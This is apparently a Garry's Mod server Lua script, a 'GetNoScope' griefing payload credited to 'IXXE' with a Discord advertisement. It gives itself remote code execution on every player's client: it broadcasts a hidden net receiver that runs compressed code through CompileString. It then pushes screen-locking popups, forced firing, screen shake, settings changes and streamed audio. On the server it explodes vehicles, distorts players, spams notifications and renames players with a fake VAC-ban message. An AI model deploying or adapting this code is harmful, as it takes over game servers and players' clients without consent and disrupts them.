
print([=[
 ██████╗ ███████╗████████╗    
██╔════╝ ██╔════╝╚══██╔══╝    
██║  ███╗█████╗     ██║       
██║   ██║██╔══╝     ██║       
╚██████╔╝███████╗   ██║       
 ╚═════╝ ╚══════╝   ╚═╝       
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║   ██║███████╗██║     ██║   ██║██████╔╝█████╗  
██║╚██╗██║██║   ██║╚════██║██║     ██║   ██║██╔═══╝ ██╔══╝ 
██║ ╚████║╚██████╔╝███████║╚██████╗╚██████╔╝██║     ███████╗ 
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝
BY IXXE --> GetNoScope V2.1.Self-Leak
Buy GVAC https://discord.gg/hvtEqjk !
¯\_(ツ)_/¯
]=])


for k, v in pairs( player.GetAll() ) do
    if ( v:Alive() ) then
     v:GodEnable()
    else
        v:Spawn()
        timer.Simple( 1.2, function()
            v:GodEnable()
        end)
    end
end


local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "☂️_PRIVATE_JOKE",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
timer.Simple( 17, function()
    SendToClient([[
print([=[
 ██████╗ ███████╗████████╗    
██╔════╝ ██╔════╝╚══██╔══╝    
██║  ███╗█████╗     ██║       
██║   ██║██╔══╝     ██║       
╚██████╔╝███████╗   ██║       
 ╚═════╝ ╚══════╝   ╚═╝       
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║   ██║███████╗██║     ██║   ██║██████╔╝█████╗  
██║╚██╗██║██║   ██║╚════██║██║     ██║   ██║██╔═══╝ ██╔══╝ 
██║ ╚████║╚██████╔╝███████║╚██████╗╚██████╔╝██║     ███████╗ 
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝
BY IXXE --> GetNoScope V2.Self-Leak
Buy GVAC https://discord.gg/hvtEqjk !
¯\_(ツ)_/¯
]=])
hook.Add("Think","🤔_WHY_YOU_WANT_EDIT_MY_CODE",function() gui.HideGameUI() end)
local CreateModel = function(mdl, isragdoll)
  local ent
  if isragdoll then
    ent = ClientsideRagdoll(mdl)
  else
    ent = ClientsideModel(mdl, RENDERGROUP_OTHER)
  end
  
  
  return ent
end
local NewHookAdd = function(str, name, func)
  --name = "dronesrewrite_hell_hooks" .. name
  hook.Add(str, name, func)
  
  table.insert(cache, {
    str = str,
    name = name
  })
end
local cache = { }
timercache = { }
local Const = 0
local Noise = nil
local pl = LocalPlayer()
timer.Create("💸_BUY_GVAC_NOW", 2, 1, function()
  local dlight = DynamicLight(pl:EntIndex())
  if dlight then
    dlight.pos = Vector(-2224.216797, -2918.063721, 2354.03125)
    dlight.r = 255
    dlight.g = 0
    dlight.b = 0
    dlight.brightness = 16
    dlight.Decay = 1000
    dlight.Size = 2000
    dlight.DieTime = CurTime() + 2
  end
  local pos = pl:GetPos() + Vector(0, 0, 120)
  local ang = Angle(0, pl:GetAngles().y, 0)
  local tr = util.TraceLine({
    start = pos,
    endpos = pos + ang:Forward() * 86,
    filter = pl
  })
  local rag_pos = tr.HitPos + tr.HitNormal * 3 - Vector(0, 0, 80)
    for i = 1, 16 do
        sound.Play("vo/npc/Barney/ba_laugh04.wav", Vector( 0, 0, 0 ) )
    end
  local mdl = CreateModel("models/food/hotdog.mdl")
  mdl:SetModelScale(5)
  mdl:SetAngles(ang + Angle(15, 180, 0))
  mdl:SetPos(rag_pos)
  mdl:Spawn()
  hook.Add("CalcView", "😕_EDIT_MY_CODE_IS_STUPID", function(ply, _pos, _ang, fov)
    local view = { }
    view.origin = pos + VectorRand()
    view.angles = ang
    view.fov = fov + math.random(-80, -50)
    
    return view
  end)
  
  timer.Create("👻_WHY_ME_PLEASE_LEAK_GIZEH", 1.4, 1, function()
    mdl:Remove()
    hook.Remove("CalcView", "😕_EDIT_MY_CODE_IS_STUPID") 
  end)
end)
]])
end)

timer.Simple( 20, function()
    timer.Create( "ouupsss", 0.1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:SendLua('RunConsoleCommand("impulse","100")')
        end
    end)
    hook.Add( 'SetupMove', '😈_NO_SCOPED', function( ply, move )
        if not ply:IsOnGround() then
            move:SetButtons( bit.band( move:GetButtons(), bit.bnot( IN_JUMP ) ) )
        end
    end )
    for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
 
        local explo = ents.Create("env_explosion")
        explo:SetPos(v:GetPos())
        explo:SetKeyValue("iMagnitude", "300")
        explo:Spawn()
        explo:Activate()
        explo:Fire("Explode", "", 0)
        end
 
    end
    for k,v in pairs(player.GetAll()) do 
        local a = v:LookupBone("ValveBiped.Bip01_Head1")
        local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
        local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
        local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
        local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
        local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
        local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
        local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
        local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
        local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
        local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
    end
    SendToClient([[
    surface.CreateFont( "1XX3_big_text",{
        font = "Open Sans", 
        size = 500,
        weight = 1000,
        antialias = true
    })
    surface.CreateFont("3Y_IXX3", {
        font = "Open Sans",  
        size = ScrW()*0.02, 
        weight = 10, 
        blursize = 0, 
        scanlines = 2.5, 
        antialias = false
    })
    local function UwU_text( a )
    
        local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local g = -0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local b = 215
    
        return Color( r, g, b, a or 255 )
    
    end
    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local MySelf = LocalPlayer()
    
    if ohno then
        ohno:Remove()
        ohno = nil
    end
    
    ohno = vgui.Create( "DFrame" )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle("")
    ohno:MakePopup();
    ohno:ShowCloseButton(false)
    ohno.Paint = function( self ) 
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
    end
    
    local pw, ph = w, h*0.6
    local px, py = w/2-pw/2, h/2-ph/2
    
    local Close = vgui.Create( "DButton", ohno )
    Close:SetPos(px, py)
    Close:SetText( "" )
    Close:SetSize( pw, ph ) 
    Close.Paint = function( self, tw, th )
            
        local shift = math.sin(RealTime()*3)*1.5 + 5
            
            draw.SimpleText( "ΣNIGMA", "1XX3_big_text", tw/2 , th/2, UwU_text( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( "ΣNIGMA", "1XX3_big_text", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.DrawText( "(╯°□°）╯︵ ┻━┻ BY IXXE", "3Y_IXX3", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
            draw.DrawText( "(╯°□°）╯︵ ┻━┻", "3Y_IXX3", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
            draw.DrawText( "Σ BY IXXE", "3Y_IXX3", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "3Y_IXX3", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ", "3Y_IXX3", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "Σ BY IXXE", "3Y_IXX3", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "3Y_IXX3", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "3Y_IXX3", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "3Y_IXX3", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;) BY IXXE", "3Y_IXX3", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "RIP ;)", "3Y_IXX3", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "ΣNIGMA", "3Y_IXX3", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "GetNoScope BY IXXE", "3Y_IXX3", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
    end
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    timer.Create("🥵_MENU_LUA_IS_DEAD_BUY_GVAC", 0.1, 0, function() 
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)
    timer.Simple( 15, function()
        wut = vgui.Create( "DFrame" )
        wut:SetSize( w, h )
        wut:SetPos(0,0)
        wut:SetDraggable ( false )
        wut:SetTitle("")
        wut:ShowCloseButton(false)
        wut.Paint = function( self ) 
            surface.SetDrawColor(30, 30, 30, 0)
        end
        local Close = vgui.Create( "DButton", wut )
        Close:SetPos(px, py)
        Close:SetText( "" )
        Close:SetSize( pw, ph ) 
        Close.Paint = function( self, tw, th )
                
            local shift = math.sin(RealTime()*3)*1.5 + 5
                
                draw.SimpleText( "ΣNIGMA", "1XX3_big_text", tw/2 , th/2, UwU_text( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                draw.SimpleText( "ΣNIGMA", "1XX3_big_text", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end
        RunConsoleCommand("r_shader_srgb","1")
        RunConsoleCommand("gmod_language","ko")
        ohno:Remove()
        ohno = nil
        local name = GetConVar("sv_skyname"):GetString()
        if name == "painted" then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == "env_skypaint" then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add("PostRender","☁️_RAINBOW",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {"lf","ft","rt","bk","dn","up"}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material("skybox/" .. name .. prefix[i])
          end
          hook.Add("PostRender","☁️_RAINBOW",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector("$color",Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
        local chienchaud = ClientsideModel("models/food/hotdog.mdl")
        chienchaud:SetNoDraw(true)
        chienchaud:SetModelScale(120)
        timer.Create("☄️_LOOK_THE_SKY", 0.01, 0, function()
          chienchaud:SetAngles(Angle(0, CurTime()*90 % 360 ,180) )
        end)
        
        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
        end
        for i=1, 150 do
          genchienchaud(i)
        end
        hook.Add("PostDrawOpaqueRenderables","🌭_CHIEN_CHAUD",function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            chienchaud:SetPos(data[i][1])
            chienchaud:SetupBones()
            chienchaud:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z <= z then
              genchienchaud(i)
            end
          end
        end)
    end )
    sound.PlayURL( "https://www.dropbox.com/s/3ft59qzmf00gpwx/mlg.mp3?dl=1", "mono noblock noplay", function( station ) 
        timer.Simple( 0.1, function()                     
            ClientStation = station
            station:EnableLooping( true )
            station:Play()
            station:SetVolume( 1 )
        end )
    end )
timer.Create("🔒", 0.11, 0, function() 
    RunConsoleCommand("+attack")
end)
timer.Create("🔓", 0.12, 0, function() 
    RunConsoleCommand("-attack")
end)
]])
end)

local you = "💸_BUY_GVAC"

timer.Simple( 20, function()

    membresenigma = 
    {
        "Akita",
        "IXXE",
        "Jodingue",
        "Kazuki",
        "Keeta",
        "Muffin",
        "Zilnix",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "GET NO SCOPE !!!!",
        "BY IXXE",
        "BY IXXE",
        "BY IXXE",
        "BY IXXE",
        "BY IXXE"
    }

    timer.Create( "🦠_NE_DEL_RIEN_SINON_CANCER", 0.2, 0, function()
        for k, ply in pairs( player.GetAll() ) do
            DarkRP.notify(ply, 2, 2, "[Oh No !] "..table.Random(membresenigma).."")
        end
    end)


    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(400 * 4);
    end


    timer.Create( "🤫_RIP_U_VAC_BANNED", 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( "rpname", "This Steam account has been VAC banned from secure servers due to a cheating infraction." )
        end

    end )

end)


timer.Create( "🤤_SPAM", 0, 0, function()
    SendToClient([[print("GET NOSCOPE  !! BY IXXE")]])
    print("GET NOSCOPE  !! BY IXXE")
end) 
